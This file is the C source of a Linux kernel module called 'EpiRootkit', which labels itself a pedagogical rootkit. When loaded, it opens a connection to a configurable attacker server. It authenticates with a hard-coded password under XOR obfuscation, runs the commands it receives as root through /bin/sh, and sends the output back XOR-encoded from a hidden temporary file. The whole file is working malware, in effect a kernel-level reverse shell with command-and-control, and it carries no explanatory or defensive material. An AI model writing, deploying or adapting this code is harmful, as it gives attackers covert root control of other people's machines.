#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

#define XOR_KEY 0x2A
#define PASSWORD "secret"
#define PASSWORD_LEN 6
#define MAX_CMD_LEN 512
#define EOF_MARKER "--EOF--"

static struct socket *g_sock = NULL;
static struct task_struct *g_conn_thread = NULL;
static int connection_state = 0;

static char *server_ip = "192.168.56.1";
static int server_port = 4444;
module_param(server_ip, charp, 0400);
module_param(server_port, int, 0400);
MODULE_PARM_DESC(server_ip, "Attacker server IP address");
MODULE_PARM_DESC(server_port, "Attacker server port");

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void xor_encrypt(char *buf, size_t len) {
    size_t i;
    for (i = 0; i < len; ++i) {
        buf[i] ^= XOR_KEY;
    }
}

static int recv_data(char *buf, size_t len) {
    struct kvec iov = {
        .iov_base = buf,
        .iov_len = len
    };
    struct msghdr msg = {0};
    return kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
}

static int rootkit_thread_fn(void *data) {
    struct sockaddr_in server;
    int err;

    while (!kthread_should_stop()) {
        err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
        if (err < 0) {
            ssleep(5);
            continue;
        }

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        server.sin_addr.s_addr = in_aton(server_ip);

        err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server, sizeof(server), 0);
        if (err && err != -EINPROGRESS) {
            sock_release(g_sock);
            g_sock = NULL;
            ssleep(5);
            continue;
        }

        notify_connection_state(1);

        char auth_buf[PASSWORD_LEN];
        int rcvd = recv_data(auth_buf, PASSWORD_LEN);
        if (rcvd != PASSWORD_LEN) {
            printk(KERN_WARNING "epirootkit: auth receive error\n");
            break;
        }

        xor_encrypt(auth_buf, PASSWORD_LEN);

        if (strncmp(auth_buf, PASSWORD, PASSWORD_LEN) != 0) {
            char fail[] = "FAIL";
            xor_encrypt(fail, sizeof(fail) - 1);
            struct kvec fiov = {
                .iov_base = fail,
                .iov_len = sizeof(fail) - 1
            };
            struct msghdr fmsg = {0};
            kernel_sendmsg(g_sock, &fmsg, &fiov, 1, fiov.iov_len);
            break;
        }

        char ok[] = "OK";
        xor_encrypt(ok, sizeof(ok) - 1);
        struct kvec iov = {
            .iov_base = ok,
            .iov_len = sizeof(ok) - 1
        };
        struct msghdr msg_hdr = {0};
        kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, iov.iov_len);

        char cmd_buf[MAX_CMD_LEN];
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            int len = recv_data(cmd_buf, MAX_CMD_LEN);
            if (len <= 0)
                break;

            xor_encrypt(cmd_buf, len);
            cmd_buf[len] = '\0';

            if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0)
                break;

            struct file *file;
            mm_segment_t old_fs = get_fs();
            loff_t pos = 0;
            char tmp_path[] = "/tmp/.rkout";
            char shell_cmd[512];
            snprintf(shell_cmd, sizeof(shell_cmd), "%s > %s 2>&1", cmd_buf, tmp_path);

            set_fs(KERNEL_DS);
            call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", shell_cmd, NULL}, NULL, UMH_WAIT_PROC);
            set_fs(old_fs);

            file = filp_open(tmp_path, O_RDONLY, 0);
            if (!IS_ERR(file)) {
                char io_buf[256];
                while (true) {
                    memset(io_buf, 0, sizeof(io_buf));
                    int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
                    if (r <= 0)
                        break;
                    xor_encrypt(io_buf, r);
                    struct kvec ciov = {
                        .iov_base = io_buf,
                        .iov_len = r
                    };
                    struct msghdr cmsg = {0};
                    kernel_sendmsg(g_sock, &cmsg, &ciov, 1, ciov.iov_len);
                }
                filp_close(file, NULL);
            }

            char eof[] = EOF_MARKER;
            xor_encrypt(eof, sizeof(eof) - 1);
            struct kvec eiov = {
                .iov_base = eof,
                .iov_len = sizeof(eof) - 1
            };
            struct msghdr emsg = {0};
            kernel_sendmsg(g_sock, &emsg, &eiov, 1, eiov.iov_len);
        }
        break;
    }

    return 0;
}

static int __init epirootkit_init(void) {
    pr_info("epirootkit: Initializing...\n");
    g_conn_thread = kthread_run(rootkit_thread_fn, NULL, "rk_conn");
    if (IS_ERR(g_conn_thread)) {
        pr_err("epirootkit: Failed to start connection thread\n");
        return PTR_ERR(g_conn_thread);
    }
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");

    if (g_conn_thread) {
        kthread_stop(g_conn_thread);
        g_conn_thread = NULL;
    }
    if (g_sock) {
        kernel_sock_shutdown(g_sock, SHUT_RDWR);
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
